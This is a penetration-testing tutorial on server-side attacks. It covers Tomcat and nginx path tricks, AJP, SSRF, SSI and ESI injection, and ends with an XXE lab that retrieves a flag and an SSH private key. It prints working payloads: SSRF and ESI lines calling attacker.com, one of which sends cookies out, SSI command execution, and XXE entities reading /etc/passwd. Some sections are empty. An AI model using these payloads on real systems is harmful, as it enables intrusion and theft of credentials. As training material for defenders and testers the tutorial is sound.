# Server Side Attacks



## Server Side Infrastructure
### Understanding Modern Infrastructure

When interacting with a web application you should be aware that nowadays it is unlikely that just one machine handles your connections.

Modern web application might consist of an application server, a separate database server ( which is secured with a firewall and separated from the outside world ), and performance increase mechanisms like content delivery networks. Often i n such a configuration, the IP correlated with the application’s domain name has nothing to do with the real application servers.

Content delivery networks have the purpose of improving an application’s availability via caching and presenting users with a cached version of a website.

They are used globally for example, when trying to view the website from different parts of the globe, users are connected with the cached version that is present on a server that is geographically closest to them.

Another "performance" part of a web application infrastructure is Load Balancers, for example, F5. Load balancers are used to distribute visitors to several servers hosting a copy of the same web applications to improve reliability.

Load balancers often utilize the "Host" header to redirect users to proper resources (e.g., virtual hosts). Apart from Load Balancers, there are caching proxies that allow caching of some resources in order to render them each time.

Moreover, devices like a Web Application Firewall or an Intrusion Detection Systems might also be incorporated into an application’s infrastructure.

Additionally, proxies and reverse proxies might be in use in order to restrict access to web resources. All these infrastructure elements can be used at once, and all of them reside between the user and the real application server.

![](./assets/1.png)





When an HTTP request is used, it passes through all these layers.

We will refer to those elements as proxies for simplicity, but keep in mind that these are also load balancers, WAFs, Caching services etc.





### Abusing Intermediate Devices

Most of these elements are configured to not only pass through but also interpret a user’s requests. They are used to exclude insecure paths or to disallow users from visiting certain resources (e.g.,/manager related pages on Tomcat based web applications)

In 2018, [interesting research](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) about handling user requested resources by web servers was released. One of the discovered bugs was the insecure combination of Tomcat and Nginx reverse proxy.



When Tomcat is combined with a nginx reverse proxy, an insecure condition may occur; this is because Tomcat itself will treat ""..;/"" as if it was a parent directory traversal sequence "../" and normalize (sanitize) that sequence.

However, when relying on the reverse proxy for this task, the proxy might not do that, allowing for escaping up one directory because they will pass that path to Tomcat unchanged, and Tomcat will not perform additional validation since it relies on the reverse proxy to do it.

For example, accessing http://tomcatapplication.com/..;/manager/ html on a vulnerable setup might reveal the Tomcat Manager.

Due to the false feeling that it is safe from external users, there is a higher likelihood to spot default credentials on such panels.

Another opportunity to access the hidden Tomcat manager is ajp proxy. AJP proxy typically runs on port 8009 and is accompanied by Tomcat based websites. Historically, it was used by standalone web servers to talk to Tomcat instances for performance reasons. The idea was to leave static content for apache and to do server side processing on Tomcat.

Ajp proxy port is often spotted during penetration testing engagements. It is not a web application port, as ajp13 is a
binary protocol; however, ajp proxy might be a gateway to internal resources, e.g., administrative panels or unpublished websites.

You can configure your own Apache instance to connect to a remote ajp port and then visit http://127.0.0.1 (localhost) to see whether it contains any interesting content.

To connect to a remote ajp port, you need to have Apache installed on your system.

```bash
 apt get install apache2
```



Then, you need to install the ajp related module:
```bash
apt install libapache2-mod-jk
```



And enable it:
```bash
a2enmod proxy_ajp
```



Next, create a file under the path `/etc/apache2/sites-enabled/ajp.conf`

![](./assets/2.png)



Then, restart apache. If everything goes well, you should be able to visit the remote website at http://127.0.0.1 . In case of errors during the apache restart, check your ajp.conf file and make sure it does not contain any additional spaces or tabs.

Since the real web application server is hidden deep inside its infrastructure, the ability to know its real IP address can be a vulnerability itself. It could be even better if one is able to issue a request on behalf of that server or in the most complex case, retrieve the results of such requests.



## Server Side Request Forgery (SSRF)
### SSRF Attack

Server Side request forgery is an attack in which the user is able to make the application server (or a proxy or another part of its infrastructure) issue a request for external resources.

The exploitation of SSRF can lead to:

- Sensitive information disclosure
- Stealing authentication information (e.g., Windows NTLM hashes)
- File read/inclusion
- Remote Code Execution

SSRF’s may occur in different places. The most obvious places to look for them are, for example, in "Load profile picture from URL" functionalities or similar features.

The safest way to fetch a remote file by the target website would be to do it using client side javascript. In such a case, the request is performed by the user’s computer and no application infrastructure takes part in requesting the remote resources.

### When SSRF is a Feature

However, websites might have to choose to fetch the resources remotely with a specialized part of the infrastructure, which is dedicated for such kind of tasks.

An example might be Facebook, which, upon referencing a remote resource in a private message, uses an internal server to fetch that resource and generate a miniature of it.

Once a URL is entered into Facebook’s message window, its server will perform a request to the remote resources. The user agent is named "facebookexternalhit", which suggests that this behavior is intended.

![](./assets/3.png)



Keep in mind that an SSRF attack can be conducted not only against "image import" utilities but any mechanisms that rely on fetching remote resources. In web applications, typically it can be:

- API specification imports (WSDL imports)
- Other file imports
- Connection to remote servers (e.g., FTP)
- "ping" or "alivecheck" utilities
- Any parts of an http request that include URLs



### Blind SSRF Exploitation

SSRF’s can also exist in "blind" form; for example, in document generators. If one is able to inject content into an online PDF generator, inserting something like the code below might likely lead to receiving a GET request from the parser server. It is because the server side content parser will try to evaluate the content before rendering the PDF.

```html
<img src=http://attacker.com:80/ssrf>
```

It will then parse the IMG tag and try to fetch the remote picture without knowing that it does not exist.



If a SSRF is received from a remote parser, it is worth inspecting the full request content (e.g., with a netcat listener) as it may contain interesting headers (including session IDs or technical information)

Another place where SSRF payloads can be inserted is HTTP request headers. You can, for example, place your domain in any HTTP header and look for HTTP or DNS resolution.

Burp intruder might be helpful in that task; for example, you can feed it with a list of [all HTTP headers](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields) and assign your domain to each of them. It is possible that some of the intermediate proxies might try to resolve these domains.

As you now know where to look for the SSRF vulnerabilities, it’s time to show you the potential impact of them. An SSRF vulnerability’s impact relies heavily on the creativity and skills of the penetration tester, as performing an arbitrary request revealing the internal IP is rarely a severe vulnerability itself.



As SSRF is about handling URL’s, let’s recall how the [URL](https://chromium.googlesource.com/chromium/src/+/master/docs/security/url_display_guidelines/url_display_guidelines.md) is built:

![](./assets/4.png)





### SSRF Example

There are a lot of elements to tamper.

We will use the "File Inclusion" module, which is similar to a web application’s fetch file functionalities. DVWA has to run in "Low" security mode.

As DVWA runs on the localhost and we want to proxy our
requests via burp, the following trick is used:

- First, socat is installed ( sudo apt-get install socat )

Then, the DVWA is exposed via port forwarding using socat: external port 800 will be connected to internal 80. Keep in mind that this will expose your vulnerable application instance to the outside world!



Forwarding is achieved using

```bash
sudo socat tcp listen:800,fork tcp:127.0.0.1:80
```

Now, DVWA is available from the outside network; in this case, we have the following IP of the virtual machine that runs dvwa

![](./assets/5.png)

Now we can try to attack the vulnerable application with the help of the Burp Repeater tool. For example, let’s start a local netcat listener and try to fetch its address via a GET request.

![](./assets/6.png)









#### Forcing Authentication

We can see that the back end server interpreter used the username/password combination as a Basic Authentication header! Th is means, when issuing an arbitrary request, we can also do it to like basic authorization protected resources

![](./assets/7.png)

#### Changing Protocol

Moreover, DVWA also accepts an https URL scheme and tries to establish an encrypted connection:

![](./assets/8.png)



Since we are using a plain text connection netcat, we just see the attempt to establish SSL to our listener.

![](./assets/9.png)



The **file://** scheme is also accepted resulting in file inclusion.

![](./assets/10.png)

You can always test more protocol handlers. Sometimes issuing a request will be available only with a few of them. [Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php)



#### Attacking SSRF on Windows

If you suspect the requesting server to be Windows based, you can also try to access a [UNC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc) path in the following format: 

```cmd
\\attackerdomain\sharename
```

If the server tries to authenticate to a fake share, you might be able to steal its NTLM password hash. The hash can be subject to further offline cracking. SMB authentication attempts can be captured, e.g., using the metasploit module **[auxiliary/server/capture/smb](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb/)**



#### Other SSRF Scenarios

Sometimes, it will be possible to fetch a remote HTML file. So, SSRF will lead to Reflected XSS:

![](./assets/11.png)



Upon visiting the URL, the remote HTML file is included by the server.

![](./assets/12.png)





#### Time based SSRF

SSRF can also be used as a time based attack, especially in blind exploitation scenarios.

Based on differences in response time, one may be able to perform an internal port scan or internal network/domain discovery.

For example, for DVWA hosted on our VM, it takes approximately 200 250 milliseconds to fetch http://example.com

![](./assets/13.png)



Asking for a non existent domain causes the page to load immediately. Even if we don’t see the output, we can infer that nothing meaningful can be loaded in such a short time, so such an address is not reachable.

![](./assets/14.png)



#### Extending SSRF

The most powerful SSRF impact is usually when it leads Remote Code Execution. Apart from obvious scenarios that involve file inclusion or reading sensitive data, SSRF sometimes allows the attacker to interact with internal services, which in turn may be vulnerable to other web attacks.

Although in such a scenario an attacker can only use GET requests, this is sometimes sufficient to execute critical actions on internal services and execute arbitrary code.



---

## Server Side Include

You can infer the presence of SSI if the web application you are assessing makes use of .shtml, .shtm or .stm pages, but
it is not the only case

Of course, blind SSI may also exist. The best option to test whether the page is vulnerable is to inject exemplary SSI tags into the web application and observe the place where they are rendered.

You can also add some exemplary SSI payloads to your Burp Intruder list when attacking web application parameters in a generic way (testing for XSSes and similar vulnerabilities)

If you are lucky, you might be able to find evaluated SSI directives in the web page response.

### SSI Expressions

A typical SSI expression has the below format. We will shortly present exemplary directives that can be used for testing and exploitation.

```html
<!--#directive param="value"-->
```



You can try the following code to execute commands for printing server side variables document name and date (echo var), file inclusion (include virtual), and code execution depending on the underlying operating system.

```html
<!--#echo var="DOCUMENT_NAME" -->

<!--#echo var="DATE_LOCAL" -->

<!--#include virtual="/index.html" -->

<!--#exec cmd="dir" -->

<!--#exec cmd="ls" -->
```







### SSI Example

A good place where you can practice these kinds of vulnerabilities is OWASP’s bWAPP pre configured Virtual Machine. (SSI does not work on the self setup release).

![](./assets/15.png)

Submitting the form results in the display of the date by the server.

![](./assets/16.png)





Of course, the other mentioned payloads also work. Below you can see an example for the "ls" command execution.

![](./assets/17.png)





### Edge Side Includes

There’s another similar set or directives called Edge Side Include. Edge Side Include is a set of similar directives but proxies and other similar intermediate infrastructure utilize them.

As previously mentioned, modern web applications often consist of several intermediate servers before users’ requests reach the end application server. We should try to interact with such intermediate infrastructure by injecting some ESI tags to our requests

Edge Side Include (ESI) has a form of xml tags, which are dynamically added to cached static content in order to enrich them with some dynamic features.

The ESI tags are injected by cache mechanisms for other cache mechanisms however, if a user is able to add ESI tags to the HTTP request, the proxies might parse it without knowing its origin.

![](./assets/18.png)





### ESI Expressions

Sample ESI tags might look as follows

```html
<esi:include src="/weather/name?id=$(QUERY_STRING{city_id}) />
```

Since cache is about improving performance, and the only content within the static page might be a menu with some cities URL, there’s no need to treat the page as dynamic. On the other hand, it cannot be full y static due to cities menu; thus, ESI tags are there to solve the issue.



#### ESI Detection

In most cases, ESI injection can only be detected using a blind attack approach. It is possible that you might see the following header in one of the application’s responses:

```http
Surrogate-Control: content="ESI/1.0”
```

In such a case, you can suspect that ESI is in use. However, in most cases, there will be no sign of using ESI or not.



In order to detect ESI injection with a blind approach, the user can try to inject tags that cause the proxies to resolve arbitrary addresses resulting in SSRF.

```html
<esi:include src=http://attacker.com />
```



#### ESI Exploitation
For exploitation scenarios, it might be possible to include a HTML file resulting in XSS

```html
<esi:include src=http://attacker.com/xss.html >
```

And the xss.html can just contain code similar to the following

```html
<script>alert(1)</script>
```



One can also try to exfiltrate cookies directly by referring to a special variable:

```
<esi:include src=http://attacker.com/$(HTTP_COOKIE) >
```

Which can bypass the httpOnly flag in case of its presence.



There is also a possibility that the ESI Injection might lead to Remote Code Execution when it has support for XSLT.

XSLT is a dynamic language used to transform XML files according to a specified pattern.

For the time being, just note the payload for the ESI Injection to the XSLT execution:

```html
<esi:include src="http://attacker.com/file.xml" dca="xslt" stylesheet="http://attacker.com/transformation.xsl"/>
```



You can also see the original research on ESI Injection by GoSecure parts [one](https://gosecure.ai/blog/2018/04/03/beyond-xss-edge-side-include-injection/) and [two](https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)



---

## Language Evaluation

























































## Attacking XSLT Engines











## Labs

### Lab1: SSRF to RCE

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<order>
<product>1234</product>
<count>&xxe;</count>
<contact>User 1</contact>
<account>Admin@123</account>
</order>
```



An XML Validator application is available on port 5000.

Send the following XML snippet for validation:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<parent>
    <child>
        <name>Test Name</name>
        <description>Test Description</description>
    </child>
</parent>
```



 Identify and exploit the XXE vulnerability.

Send the following XML snippet containing an XML entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY desc "Test Description"> ]>
<parent>
    <child>
        <name>Test Name</name>
        <description>&desc;</description>
    </child>
</parent>
```

Notice the response contains the description specified in the XML entity!

Not that we know there is an XXE vulnerability; let's leverage it to pull information on the internal services running on the target machine.

Use the following XML snippet to read the contents of the `/proc/net/tcp` file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY file SYSTEM "file:///proc/net/tcp">
]>
<data>&file;</data>
```

Notice we got back the file contents!

**Contents of the `/proc/net/tcp` file**:

```
sl local_address rem_address st tx_queue rx_queue tr tm->when retrnsmt uid timeout inode
0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74435656 1 0000000000000000 100 0 0 10 0
1: 0100007F:22B8 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74418007 1 0000000000000000 100 0 0 10 0
2: 0B00007F:9599 00000000:0000 0A 00000000:00000000 00:00000000 00000000 65534 0 74430920 1 0000000000000000 100 0 0 10 0
3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74434697 1 0000000000000000 100 0 0 10 0
4: 034CDCC0:1F40 024CDCC0:EB4C 06 00000000:00000000 03:0000176F 00000000 0 0 0 3 0000000000000000
5: 034CDCC0:1F40 024CDCC0:EB4E 01 00000000:00000000 00:00000000 00000000 0 0 74434828 1 0000000000000000 20 4 30 10 -1
```

**Note:** The information you received would differ slightly since the IP addresses of the machines change at every lab launch. Kindly make sure to fetch the contents of the above file before proceeding.

Decode the IP addresses and port numbers retrieved from the `/proc/net/tcp` file.

Use the following Python script to convert the IP addresses in hex to dotted-decimal notation:

**convert.py:**

```python
import socket
import struct
hex_ip = input("Enter IP (in hex): ")
addr_long = int(hex_ip, 16)
print("IP in dotted-decimal notation:", socket.inet_ntoa(struct.pack("<L", addr_long)))
```





We will send the following XML snippet to the vulnerable web application:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd">
    %dtd;
    %all;
]>
<data>&fileContents;</data>
```



Before sending the above XXE payload, save the following snippet as `evil.dtd`:

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```



Start a Python-based HTTP server on port 8080:

```bash
python3 -m http.server 8080
```



**Information on the payload:**

The first payload (sent to the web app for validation) would load the contents of the `evil.dtd` file from the attacker machine and then this file would be parsed by the backend.

The `evil.dtd` file contains the entity that sends a request to `localhost:8888` and the result is embedded within the CDATA section.

**Information on CDATA:** CDATA sections can be used to "block escape" literal text when replacing prohibited characters with entity references is undesirable.

**Reference:** https://www.w3resource.com/xml/CDATA-sections.php

Some examples of prohibited characters are `<`, `>`, `&`, `"`, `'`.

So, the above payload makes sure that if the response does contain some restricted characters, those characters will get embedded into the CDATA section, and hence the XML validator will raise no errors.



Notice there are 2 entries: **.ssh/** and **flag1**.

Let's fetch these in the subsequent steps.

**Note:** The other internal port open on the machine won't return any information. You are encouraged to interact with it by modifying the `evil.dtd` file to contain the IP and port on which that service is running.

Retrieve the first flag via XXE.

Modify the `evil.dtd` file to fetch the contents of file `flag1`:

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888/flag1">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```







The output contains the properly-formatted private SSH key.

The above command does the following: - Adds a new line after the `-----BEGIN RSA PRIVATE KEY-----` string - Adds a new line before the `-----END RSA PRIVATE KEY-----` string - For all other string blocks, it adds a new line after every 64 characters

Use the following command to save the formatted private key to the file `fixed_id_rsa`:

```bash
sed -e "s/-----BEGIN RSA PRIVATE KEY-----/&\n/" \
    -e "s/-----END RSA PRIVATE KEY-----/\n&/" \
    -e "s/\S\{64\}/&\n/g" \
    id_rsa > fixed_id_rsa
```
